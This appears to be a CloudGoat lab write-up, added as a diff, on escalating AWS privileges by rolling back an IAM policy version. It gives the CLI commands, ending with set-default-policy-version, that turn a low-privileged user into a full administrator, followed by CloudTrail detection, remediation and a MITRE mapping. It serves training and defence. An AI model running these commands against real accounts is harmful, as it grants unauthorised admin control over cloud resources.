@@ -1,0 +1,163 @@
+# 01 — IAM Privilege Escalation by Rollback
+
+## 🎯 Objective
+
+Starting as a low-privileged IAM user named **Raynor**, enumerate IAM policies and discover a hidden policy version with full administrator access. Roll back to that version to escalate privileges to full AWS admin.
+
+---
+
+## 🏗️ Environment
+
+| Resource | Details |
+|---|---|
+| **Starting User** | `raynor` (low-privileged IAM user) |
+| **Vulnerability** | IAM customer managed policy with multiple versions — one containing `Action: * / Resource: *` |
+| **Goal** | Escalate to full AWS administrator |
+| **Tool** | AWS CLI |
+
+---
+
+## ⚔️ Attack Path
+
+### Step 1 — Enumerate Attached Policies
+Identify what policies are attached to the starting user.
+
+```bash
+aws iam list-attached-user-policies \
+  --user-name raynor-<id> \
+  --profile raynor
+```
+
+**Finding:** One customer managed policy attached: `cg-raynor-policy`
+
+---
+
+### Step 2 — List All Policy Versions
+IAM customer managed policies can have up to 5 versions. Enumerate all of them.
+
+```bash
+aws iam list-policy-versions \
+  --policy-arn arn:aws:iam::<account-id>:policy/cg-raynor-policy-<id> \
+  --profile raynor
+```
+
+**Finding:** 5 versions exist (v1–v5). v1 is the current default.
+
+📸 *Screenshot: list-policy-versions output showing all 5 versions*
+
+---
+
+### Step 3 — Read Each Policy Version
+Inspect each version's permissions to find the most privileged one.
+
+```bash
+aws iam get-policy-version \
+  --policy-arn arn:aws:iam::<account-id>:policy/cg-raynor-policy-<id> \
+  --version-id v3 \
+  --profile raynor
+```
+
+**Finding:** Version 3 contains:
+```json
+{
+  "Action": "*",
+  "Effect": "Allow",
+  "Resource": "*"
+}
+```
+Full administrator access on all AWS resources.
+
+📸 *Screenshot: get-policy-version output showing v3 with Action: \* Resource: \**
+
+---
+
+### Step 4 — Roll Back to Version 3 (Privilege Escalation)
+Set v3 as the default policy version, granting raynor full admin access.
+
+```bash
+aws iam set-default-policy-version \
+  --policy-arn arn:aws:iam::<account-id>:policy/cg-raynor-policy-<id> \
+  --version-id v3 \
+  --profile raynor
+```
+
+📸 *Screenshot: AWS Console → IAM → Policies → Policy versions showing v3 as Default*
+
+---
+
+### Step 5 — Verify Full Admin Access
+Confirm privilege escalation by listing all IAM users — an action raynor previously could not perform.
+
+```bash
+aws iam list-users --profile raynor
+```
+
+**Finding:** Successfully enumerated all users in the account — privilege escalation confirmed.
+
+📸 *Screenshot: list-users output showing all account users*
+
+---
+
+## 🗺️ Attack Flow Diagram
+
+```
+Enumerate attached policies (list-attached-user-policies)
+                ↓
+Discover cg-raynor-policy with 5 versions
+                ↓
+Read each version → v3 has Action:* Resource:*
+                ↓
+Roll back to v3 (set-default-policy-version)
+                ↓
+💥 Full AWS Administrator Access
+```
+
+---
+
+## 🔍 Detection
+
+A SOC analyst or automated alert would detect this attack via:
+
+| Detection | AWS Service | Event |
+|---|---|---|
+| Policy version enumeration | CloudTrail | `GetPolicyVersion` called multiple times |
+| Policy default changed | CloudTrail | `SetDefaultPolicyVersion` event |
+| Unusual IAM enumeration | CloudTrail | `ListUsers` by low-privileged account |
+| Policy with Action:\* | AWS Config | Managed rule: `iam-policy-no-statements-with-admin-access` |
+
+**CloudTrail Query:**
+```
+EventName = SetDefaultPolicyVersion
+```
+This single event is the clearest indicator of this attack technique.
+
+---
+
+## 🛡️ Remediation
+
+| Misconfiguration | Fix |
+|---|---|
+| Unused policy versions with high privileges | Delete all non-default policy versions regularly |
+| Policy with `Action: *` | Enforce least privilege — never use wildcard actions |
+| No alerting on policy changes | Enable CloudTrail + CloudWatch alert on `SetDefaultPolicyVersion` |
+| No AWS Config rules | Enable `iam-policy-no-statements-with-admin-access` Config rule |
+
+---
+
+## 📚 MITRE ATT&CK Mapping
+
+| Technique ID | Technique Name | Description |
+|---|---|---|
+| T1078.004 | Valid Accounts: Cloud Accounts | Used valid raynor credentials to authenticate |
+| T1548 | Abuse Elevation Control Mechanism | Exploited IAM policy versioning to escalate |
+| T1098 | Account Manipulation | Modified policy default version to gain admin |
+| T1087.004 | Account Discovery: Cloud Account | Enumerated IAM users after escalation |
+
+---
+
+## 🔧 Tools Used
+
+- AWS CLI
+- CloudGoat (Rhino Security Labs)
+- AWS IAM Console
+- AWS CloudTrail
